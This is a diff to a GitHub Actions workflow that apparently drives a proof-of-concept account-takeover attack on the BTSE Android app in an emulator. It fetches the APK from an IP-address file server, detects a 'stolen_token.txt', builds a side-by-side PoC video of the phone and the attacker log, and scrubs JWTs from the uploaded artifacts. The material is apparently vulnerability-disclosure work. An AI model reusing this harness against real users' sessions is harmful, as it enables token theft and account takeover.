@@ -3,7 +3,7 @@ on: workflow_dispatch
 jobs:
   nop_test:
     runs-on: ubuntu-latest
-    timeout-minutes: 45
+    timeout-minutes: 120
     env:
       # UI login via the app path always fails (the server rejects logins from the
       # emulator) and costs ~10 minutes each. The victim session comes purely from prefs injection.
@@ -35,6 +35,22 @@ jobs:
         with:
           path: /tmp/apks
           key: btse-apks-v1
+      - name: fetch apk (from SG file server)
+        run: |
+          mkdir -p /tmp/apks
+          WANT=4874360546fec03af7a99ad796a865845f57320c4120b9715c1853c9728424ad
+          HAVE=$(sha256sum /tmp/apks/real.apk 2>/dev/null | cut -d' ' -f1 || true)
+          if [ "$HAVE" != "$WANT" ]; then
+            for a in 1 2 3; do
+              curl -4 -fSL --retry 2 --retry-delay 5 --max-time 3000 \
+                -o /tmp/apks/real.apk \
+                "http://43.156.21.122:8081/btse_real.apk" && break
+              sleep 10
+            done
+          fi
+          test -s /tmp/apks/real.apk || { echo "APK_FETCH_FAIL"; exit 1; }
+          ls -la /tmp/apks/real.apk
+          sha256sum /tmp/apks/real.apk
       - name: sdk+avd
         run: |
           echo "PATH=$ANDROID_HOME/platform-tools:$ANDROID_HOME/emulator:$PATH" >> $GITHUB_ENV
@@ -358,6 +374,7 @@ jobs:
               break
             fi
             # record the screen for the PoC video (max 170s < screenrecord limit 180s)
+            T0REC=$(date +%H:%M:%S)
             ( adb shell screenrecord --time-limit 170 /sdcard/poc_r${round}.mp4 > /dev/null 2>&1 & )
             echo "SCREEN_RECORD r${round} started"
             # in-loop gate PASSIVE: wait for focus to come back (max 30s), no relaunch = no burst
@@ -452,7 +469,12 @@ jobs:
               sleep 3
             done
             echo "VIDEO_R${round}=$(stat -c %s /tmp/poc_r${round}.mp4 2>/dev/null || echo missing) FINALIZED=$VIDOK"
-            if [ -s stolen_token.txt ]; then break; fi
+            if [ -s stolen_token.txt ]; then
+              echo "$round" > /tmp/success_round.txt
+              echo "$T0REC" > /tmp/success_t0.txt
+              echo "SUCCESS_ROUND=$round T0REC=$T0REC"
+              break
+            fi
             echo "ROUND=$round NO_TOKEN TAPPED=$TAPPED ERRC=$ERRC moving to next round"
           done
           adb shell screencap -p /sdcard/s5.png || true
@@ -468,9 +490,28 @@ jobs:
           else
             echo "VERDICT=NO_ATO"
           fi
+          sed -i 's/eyJ[A-Za-z0-9_-]\{10,\}\.[A-Za-z0-9_-]\{10,\}\.[A-Za-z0-9_-]\{10,\}/<JWT>/g' /tmp/logcat.txt 2>/dev/null || true
+          echo "=== attack.log (tail, JWT-scrubbed for the job log) ==="
+          sed 's/eyJ[A-Za-z0-9_-]\{10,\}\.[A-Za-z0-9_-]\{10,\}\.[A-Za-z0-9_-]\{10,\}/<JWT>/g' /tmp/attack.log | tail -c 3000
+      - name: compose poc video (side-by-side phone | attacker log)
+        if: always()
+        run: |
+          ROUND=$(cat /tmp/success_round.txt 2>/dev/null | tr -d '\r' || true)
+          T0=$(cat /tmp/success_t0.txt 2>/dev/null | tr -d '\r' || true)
+          echo "COMPOSE round=$ROUND t0=$T0"
+          if [ -n "$ROUND" ] && [ -n "$T0" ] && [ -s /tmp/poc_r${ROUND}.mp4 ] && [ -s /tmp/attack.log ]; then
+            if ! command -v ffmpeg >/dev/null 2>&1; then
+              sudo apt-get update -qq && sudo apt-get install -y -qq ffmpeg fonts-dejavu-core || true
+            fi
+            python3 tools/mkvideo.py --log /tmp/attack.log --phone /tmp/poc_r${ROUND}.mp4 \
+              --out /tmp/poc_final.mp4 --t0 "$T0" || echo COMPOSE_FAIL
+          else
+            echo "COMPOSE_SKIP (no successful round / no log)"
+          fi
+          # scrub JWT + refresh material from everything that will be uploaded as an artifact
           sed -i 's/eyJ[A-Za-z0-9_-]\{10,\}\.[A-Za-z0-9_-]\{10,\}\.[A-Za-z0-9_-]\{10,\}/<JWT>/g' /tmp/attack.log /tmp/logcat.txt 2>/dev/null || true
-          echo "=== attack.log (redacted) ==="
-          tail -c 3000 /tmp/attack.log
+          sed -i 's/\[ATO\]   [A-Za-z0-9_-]\{40,\}/[ATO]   <redacted>/g' /tmp/attack.log 2>/dev/null || true
+          ls -la /tmp/poc_final.mp4 2>/dev/null || echo NO_POC_FINAL
       - uses: actions/upload-artifact@v4
         if: always()
         with:
@@ -484,6 +525,7 @@ jobs:
             /tmp/s5.png
             /tmp/poc_r1.mp4
             /tmp/poc_r2.mp4
+            /tmp/poc_final.mp4
             /tmp/ui.xml
             /tmp/ui_state_*.png
             /tmp/logcat.txt
